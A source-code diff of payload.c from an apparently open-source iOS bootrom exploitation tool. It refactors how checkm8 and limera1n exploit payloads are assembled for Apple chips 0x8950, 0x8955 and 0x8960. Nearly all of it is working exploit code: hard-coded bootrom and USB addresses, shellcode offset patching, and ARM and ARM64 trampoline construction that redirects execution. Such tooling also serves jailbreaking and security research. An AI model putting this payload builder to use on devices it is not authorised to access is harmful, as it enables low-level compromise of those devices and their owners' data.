@@ -1,22 +1,37 @@
+/*
+ * payload.c
+ * copyright (C) 2020/05/25 dora2ios
+ *
+ */
+
 #include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
 
-#include <include/libexploit.h>
-#include <include/exploit/checkm8_payload.h>
-#include <include/exploit/limera1n_payload.h>
+#include <payload.h>
+#include <checkm8_payload.h>
+#include <limera1n_payload.h>
 
+#define bswap32 __builtin_bswap32
+
+#define PAYLOAD_OFFSET_ARMV7 384
+#define PAYLOAD_SIZE_ARMV7 320
+#define TRAMPOLINE_SIZE_ARMV7 sizeof(uint64_t)
+
+// for 64-bit
 unsigned char trampoline64[] = {
     0x68, 0x65, 0x6c, 0x6c, // - 0
     0x6f, 0x20, 0x6b, 0x69, // - 4
     0x6e, 0x2d, 0x69, 0x72, // - 8
     0x6f, 0x20, 0x6d, 0x6f, // - 12
-    
     0x73, 0x61, 0x69, 0x63  // - 16
 };
 
+// based on synackuk's belladonna
+// https://github.com/synackuk/belladonna/blob/824363bbc287da3cd2d97cba69aa746db89a86b6/src/exploits/checkm8/payload_gen.c
+
 char* thumb_trampoline(uint32_t src, uint32_t dest) {
-    char* trampoline = malloc(sizeof(uint64_t));
+    char* trampoline = malloc(TRAMPOLINE_SIZE_ARMV7);
     if(src % 2 != 1 || dest % 2 != 1) {
         free(trampoline);
         return NULL;
@@ -52,8 +67,9 @@ char* asm_arm64_branch(uint32_t src, uint32_t dest) {
     return trampoline;
 }
 
+
 int add_payload_offsets(unsigned char* payload, size_t payload_len, uint32_t* offsets, size_t num_offsets) {
-    for(int i = 0; i < num_offsets; i++) {
+    for(size_t i = 0; i < num_offsets; i++) {
         uint32_t value = 0xBAD00001 + i;
         char* ptr = memmem(payload, payload_len, &value, sizeof(uint32_t));
         if(!ptr) {
@@ -61,16 +77,6 @@ int add_payload_offsets(unsigned char* payload, size_t payload_len, uint32_t* of
         }
         *(uint32_t*) ptr = offsets[i];
     }
-    return 0;
-}
-
-int add_trampoline(unsigned char* payload, size_t payload_len, char* trampoline, size_t trampoline_len) {
-    uint32_t value = 0xFEEDFACE;
-    char* ptr = memmem(payload, payload_len, &value, sizeof(uint32_t));
-    if(!ptr) {
-        return -1;
-    }
-    memcpy(ptr, trampoline, trampoline_len);
     return 0;
 }
 
@@ -83,6 +89,17 @@ int add_payload_offsets64(unsigned char* payload, size_t payload_len, uint64_t* 
         }
         *(uint64_t*) ptr = offsets[i];
     }
+    return 0;
+}
+
+
+int add_trampoline(unsigned char* payload, size_t payload_len, char* trampoline, size_t trampoline_len) {
+    uint32_t value = 0xFEEDFACE;
+    char* ptr = memmem(payload, payload_len, &value, sizeof(uint32_t));
+    if(!ptr) {
+        return -1;
+    }
+    memcpy(ptr, trampoline, trampoline_len);
     return 0;
 }
 
@@ -116,24 +133,31 @@ int add_trampoline64_asm_arm64_branch(unsigned char* payload, size_t payload_len
     return 0;
 }
 
-int get_payload_configuration(int cpid, char* identifier, unsigned char** payload, size_t* payload_len) {
+
+int get_payload_configuration(uint16_t cpid, const char* identifier, checkm8_config_t* config) {
     int ret;
+    //config->payload = malloc(checkm8_payload_length_armv7);
+    //config->payload_len = checkm8_payload_length_armv7;
+    //memcpy(config->payload, checkm8_payload_armv7, checkm8_payload_length_armv7);
     
     uint32_t* shellcode_constants;
     size_t shellcode_constants_len;
     uint32_t* usb_constants;
     size_t usb_constants_len;
+    
     uint64_t* shellcode_constants64;
     uint64_t* usb_constants64;
+    
     char* trampoline;
     char* trampoline2;
     size_t trampoline_len;
     size_t trampoline2_len;
+    
     switch(cpid) {
         case 0x8950:
-            *payload = malloc(checkm8_payload_length_armv7);
-            *payload_len = checkm8_payload_length_armv7;
-            memcpy(*payload, checkm8_payload_armv7, checkm8_payload_length_armv7);
+            config->payload = malloc(checkm8_payload_length_armv7);
+            config->payload_len = checkm8_payload_length_armv7;
+            memcpy(config->payload, checkm8_payload_armv7, checkm8_payload_length_armv7);
             
             shellcode_constants = (uint32_t[8]){
                 0x10061988, // 1 - gUSBDescriptors
@@ -141,12 +165,12 @@ int get_payload_configuration(int cpid, char* identifier, unsigned char** payloa
                 0x7C54+1, // 3 - usb_create_string_descriptor
                 0x100600D8, // 4 - gUSBSRNMStringDescriptor
                 0x10079800, // 5 - PAYLOAD_DEST
-                384, // 6 - PAYLOAD_OFFSET
-                320, // 7 - PAYLOAD_SIZE
+                PAYLOAD_OFFSET_ARMV7, // 6 - PAYLOAD_OFFSET
+                PAYLOAD_SIZE_ARMV7, // 7 - PAYLOAD_SIZE
                 0x10061A24, // 8 - PAYLOAD_PTR
             };
-            shellcode_constants_len = 8;
             
+            shellcode_constants_len = 8;
             usb_constants = (uint32_t[0x8]){
                 0x10000000, // 1 - LOAD_ADDRESS
                 0x65786563, // 2 - EXEC_MAGIC
@@ -161,16 +185,16 @@ int get_payload_configuration(int cpid, char* identifier, unsigned char** payloa
             
             trampoline = thumb_trampoline(0x10079800+1, 0x8160+1);
             if(!trampoline) {
-                printf("failed to build payload trampoline.\n");
+                printf("Failed to build payload trampoline.\n");
                 return -1;
             }
-            trampoline_len = sizeof(uint64_t);
+            trampoline_len = TRAMPOLINE_SIZE_ARMV7;
             break;
             
         case 0x8955:
-            *payload = malloc(checkm8_payload_length_armv7);
-            *payload_len = checkm8_payload_length_armv7;
-            memcpy(*payload, checkm8_payload_armv7, checkm8_payload_length_armv7);
+            config->payload = malloc(checkm8_payload_length_armv7);
+            config->payload_len = checkm8_payload_length_armv7;
+            memcpy(config->payload, checkm8_payload_armv7, checkm8_payload_length_armv7);
             
             shellcode_constants = (uint32_t[8]){
                 0x10061988, // 1 - gUSBDescriptors
@@ -178,8 +202,8 @@ int get_payload_configuration(int cpid, char* identifier, unsigned char** payloa
                 0x7C94+1, // 3 - usb_create_string_descriptor
                 0x100600D8, // 4 - gUSBSRNMStringDescriptor
                 0x10079800, // 5 - PAYLOAD_DEST
-                384, // 6 - PAYLOAD_OFFSET
-                320, // 7 - PAYLOAD_SIZE
+                PAYLOAD_OFFSET_ARMV7, // 6 - PAYLOAD_OFFSET
+                PAYLOAD_SIZE_ARMV7, // 7 - PAYLOAD_SIZE
                 0x10061A24, // 8 - PAYLOAD_PTR
             };
             shellcode_constants_len = 8;
@@ -198,17 +222,16 @@ int get_payload_configuration(int cpid, char* identifier, unsigned char** payloa
             
             trampoline = thumb_trampoline(0x10079800+1, 0x81A0+1);
             if(!trampoline) {
-                printf("failed to build payload trampoline.\n");
+                printf("Failed to build payload trampoline.\n");
                 return -1;
             }
-            trampoline_len = sizeof(uint64_t);
+            trampoline_len = TRAMPOLINE_SIZE_ARMV7;
             break;
             
-        case 0x8960:
-            *payload = malloc(checkm8_payload_length_arm64);
-            *payload_len = checkm8_payload_length_arm64;
-            memcpy(*payload, checkm8_payload_arm64, checkm8_payload_length_arm64);
-            
+            case 0x8960:
+            config->payload = malloc(checkm8_payload_length_arm64);
+            config->payload_len = checkm8_payload_length_arm64;
+            memcpy(config->payload, checkm8_payload_arm64, checkm8_payload_length_arm64);
             shellcode_constants64 = (uint64_t[8]){
                 0x180086B58, //# 1 - gUSBDescriptors
                 0x180086CDC, //# 2 - gUSBSerialNumber
@@ -244,120 +267,60 @@ int get_payload_configuration(int cpid, char* identifier, unsigned char** payloa
                 return -1;
             }
             trampoline2_len = sizeof(uint32_t);
-            
-            break;
-            
-        default:
-            printf("no payload offsets are available for this device.\n");
-            return -1;
-    }
-    
-    
-    switch(cpid) {
-        case 0x8950:
-            ret = add_payload_offsets(*payload, *payload_len, shellcode_constants, shellcode_constants_len);
-            if(ret != 0) {
-                printf("failed to add offsets to payload.\n");
-                return -1;
-            }
-            
-            break;
-            
-        case 0x8955:
-            ret = add_payload_offsets(*payload, *payload_len, shellcode_constants, shellcode_constants_len);
-            if(ret != 0) {
-                printf("failed to add offsets to payload.\n");
-                return -1;
-            }
-            
-            break;
-            
-        case 0x8960:
-            ret = add_payload_offsets64(*payload, *payload_len, shellcode_constants64, shellcode_constants_len);
-            if(ret != 0) {
-                printf("failed to add offsets to payload.\n");
-                return -1;
-            }
-            
-            break;
-        default:
-            printf("failed to add offsets to payload.\n");
-            return -1;
-    }
-    
-    switch(cpid) {
-        case 0x8950:
-            ret = add_payload_offsets(*payload, *payload_len, usb_constants, usb_constants_len);
-            if(ret != 0) {
-                printf("failed to add offsets to payload.\n");
-                return -1;
-            }
-            
-            break;
-            
-        case 0x8955:
-            ret = add_payload_offsets(*payload, *payload_len, usb_constants, usb_constants_len);
-            if(ret != 0) {
-                printf("failed to add offsets to payload.\n");
-                return -1;
-            }
-            
             break;
         
-        case 0x8960:
-            ret = add_payload_offsets64(*payload, *payload_len, usb_constants64, usb_constants_len);
-            if(ret != 0) {
-                printf("failed to add offsets to payload.\n");
-                return -1;
-            }
-            
-            break;
         default:
-            printf("failed to add offsets to payload.\n");
+            printf("No payload offsets are available for your device.\n");
             return -1;
     }
     
-    switch(cpid) {
-        case 0x8950:
-            ret = add_trampoline(*payload, *payload_len, trampoline, trampoline_len);
-            if(ret != 0) {
-                printf("failed to add trampoline to payload.\n");
-                return -1;
-            }
-            
-            break;
-            
-        case 0x8955:
-            ret = add_trampoline(*payload, *payload_len, trampoline, trampoline_len);
-            if(ret != 0) {
-                printf("failed to add trampoline to payload.\n");
-                return -1;
-            }
-            
-            break;
-            
-        case 0x8960:
-            ret = add_trampoline64_asm_arm64_x7_trampoline(*payload, *payload_len, trampoline, trampoline_len);
-            if(ret != 0) {
-                printf("failed to add trampoline1 to payload.\n");
-                return -1;
-            }
-            
-            ret = add_trampoline64_asm_arm64_branch(*payload, *payload_len, trampoline2, trampoline2_len);
-            if(ret != 0) {
-                printf("failed to add trampoline2 to payload.\n");
-                return -1;
-            }
-            
-            break;
-        default:
+    if((cpid|0xf) == 0x895f){
+        ret = add_payload_offsets(config->payload, config->payload_len, shellcode_constants, shellcode_constants_len);
+        if(ret != 0) {
+            printf("Failed to add offsets to payload.\n");
+            return -1;
+        }
+        ret = add_payload_offsets(config->payload, config->payload_len, usb_constants, usb_constants_len);
+        if(ret != 0) {
+            printf("Failed to add offsets to payload.\n");
+            return -1;
+        }
+        ret = add_trampoline(config->payload, config->payload_len, trampoline, trampoline_len);
+        if(ret != 0) {
+            printf("Failed to add trampoline to payload.\n");
+            return -1;
+        }
+    }
+    
+    if(cpid == 0x8960){
+        ret = add_payload_offsets64(config->payload, config->payload_len, shellcode_constants64, shellcode_constants_len);
+        if(ret != 0) {
             printf("failed to add offsets to payload.\n");
             return -1;
+        }
+        ret = add_payload_offsets64(config->payload, config->payload_len, usb_constants64, usb_constants_len);
+        if(ret != 0) {
+            printf("failed to add offsets to payload.\n");
+            return -1;
+        }
+        ret = add_trampoline64_asm_arm64_x7_trampoline(config->payload, config->payload_len, trampoline, trampoline_len);
+        if(ret != 0) {
+            printf("failed to add trampoline1 to payload.\n");
+            return -1;
+        }
+        
+        ret = add_trampoline64_asm_arm64_branch(config->payload, config->payload_len, trampoline2, trampoline2_len);
+        if(ret != 0) {
+            printf("failed to add trampoline2 to payload.\n");
+            return -1;
+        }
     }
     
     return 0;
 }
 
+
+// limera1n helper
 int add_exploit_lr(unsigned char* payload, size_t payload_len, uint32_t* exploit_lr, size_t exploit_lr_len) {
     uint32_t magic = 0xFEEDFACE;
     char* ptr;
